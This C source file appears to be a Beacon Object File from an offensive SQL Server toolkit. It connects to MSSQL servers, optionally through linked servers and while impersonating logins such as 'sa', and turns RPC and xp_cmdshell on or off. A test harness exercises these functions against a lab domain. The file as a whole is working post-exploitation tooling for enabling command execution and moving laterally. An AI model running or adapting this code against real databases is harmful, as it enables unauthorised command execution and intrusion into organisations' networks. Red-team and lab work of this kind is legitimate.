#include "bofdefs.h"
#include "base.c"
#include "sql.c"
#include "sql_modules.c"


// rpc requires different functions/values than the other modules
void ToggleRpc(char* server, char* database, char* link, char* impersonate, char* value)
{
    SQLHENV env		= NULL;
    SQLHSTMT stmt 	= NULL;
	SQLHDBC dbc 	= NULL;

	dbc = ConnectToSqlServer(&env, server, database);

    if (dbc == NULL) {
		goto END;
	}

	internal_printf("[*] Toggling RPC on %s...\n\n", link);

	//
	// allocate statement handle
	//
	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

	if (!ToggleModule(stmt, "rpc", value, link, impersonate))
	{
		goto END;
	}

	//
	// Close the cursor
	//
	ODBC32$SQLCloseCursor(stmt);

	
	if (!CheckRpcOnLink(stmt, link, impersonate))
	{
		goto END;
	}

	PrintQueryResults(stmt, TRUE);

	//
	// close the cursor
	//
	ODBC32$SQLCloseCursor(stmt);

END:
	DisconnectSqlServer(env, dbc, stmt);
}


// non-rpc modules are treated the same
void ToggleGenericModule(char* server, char* database, char* link, char* impersonate, char* module, char* value)
{
    SQLHENV env		= NULL;
    SQLHSTMT stmt 	= NULL;
	SQLHDBC dbc 	= NULL;

	dbc = ConnectToSqlServer(&env, server, database);

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

	if (link == NULL)
	{
		internal_printf("[*] Toggling %s on %s...\n\n", module, server);
	}
	else
	{
		internal_printf("[*] Toggling %s on %s via %s\n\n", module, link, server);
	}
	
	if (!ToggleModule(stmt, module, value, link, impersonate))
	{
		goto END;
	}

	//
	// Close the cursor
	//
	ODBC32$SQLCloseCursor(stmt);

	//
	// Check new status and print
	//

	CheckModuleStatus(stmt, module, link, impersonate);

	PrintQueryResults(stmt, TRUE);

END:
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* module;
	char* value;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	module 		= BeaconDataExtract(&parser, NULL);
	value 		= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	// we're toggling RPC
	if (MSVCRT$strcmp(module, "rpc") == 0)
	{
		if (link == NULL)
		{
			internal_printf("[!] A link must be specified\n");
			printoutput(TRUE);
			return;
		}
		ToggleRpc(server, database, link, impersonate, value);
	}
	// we're toggling one of the other modules that we treat the same
	else
	{
		if (UsingLinkAndImpersonate(link, impersonate))
		{
			return;
		}

		ToggleGenericModule(server, database, link, impersonate, module, value);
	}
	

	printoutput(TRUE);
};

#else

int main()
{
	internal_printf("============ LINK RPC DISABLE TEST ============\n\n");
	ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "FALSE");

	internal_printf("\n\n============ LINK RPC ENABLE TEST ============\n\n");
	ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "TRUE");

	internal_printf("\n\n============ BASE XP_CMDSHELL DISABLE TEST ============\n\n");
	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "xp_cmdshell", "0");

	internal_printf("\n\n============ BASE XP_CMDSHELL ENABLE TEST ============\n\n");
	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "xp_cmdshell", "1");

	internal_printf("\n\n============ IMPERSONATE XP_CMDSHELL DISABLE TEST ============\n\n");
	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "xp_cmdshell", "0");

	internal_printf("\n\n============ IMPERSONATE XP_CMDSHELL ENABLE TEST ============\n\n");
	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "xp_cmdshell", "1");	

	internal_printf("\n\n============ LINK XP_CMDSHELL DISABLE TEST ============\n\n");
	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "xp_cmdshell", "0");

	internal_printf("\n\n============ LINK XP_CMDSHELL ENABLE TEST ============\n\n");
	ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "xp_cmdshell", "1");
}

#endif
